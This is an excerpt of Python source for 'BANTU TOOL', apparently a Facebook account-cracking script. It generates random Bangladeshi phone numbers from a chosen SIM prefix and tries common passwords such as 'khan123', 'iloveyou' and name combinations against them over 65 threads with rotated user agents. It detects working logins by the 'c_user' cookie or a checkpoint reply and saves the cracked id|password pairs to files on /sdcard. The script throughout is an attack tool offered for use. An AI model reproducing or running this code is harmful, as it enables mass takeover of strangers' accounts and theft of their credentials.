...
##     ##   ## ##   ###   ##    ##    ##     ##
##     ##  ##   ##  ####  ##    ##    ##     ##
########  ##     ## ## ## ##    ##    ##     ## \033[1;34mL \033[1;37m
##     ## ######### ##  ####    ##    ##     ## \033[1;31m I\033[1;37m
##     ## ##     ## ##   ###    ##    ##     ## \033[1;35mT \033[1;37m
########  ##     ## ##    ##    ##     #######  \033[1;31m E\033[1;37m
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> BANTU TOOL VERSION :\x1b[1;92m 1.0 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/Example.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[ BANTU ] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[BANTU-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/BANTU-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[BANTU-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/BANTU-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[BANTU] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[BANTU-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[BANTU-CP] '+ids+' | '+pas+'\033[1;97m')
...
def menu():
	os.system('clear')
	print(logo)
	print('[1] Other Countries Cloneing')
	print('[2] Bangladesh Random Cloneing')
	linex()
	opt = input('[√] SELECT COUNTRY :~ ')
	if opt =='1':
		random_number1()
	elif opt =='2':
		random_number2()
...
def random_number2():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :016~017~018~019.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	limit = int(input('[+]How Many Numbers Do Youu Want To Add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = ['khan12','khan123','bangladesh','+880','i love you','i love you2','iloveyou','Bangladesh','first last','last first','firstlast','lastfirst','first123','last123',]
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mBANTU\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[BANTU-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[BANTU-OK] '+cid+' | '+ps+'\33[0;97m')
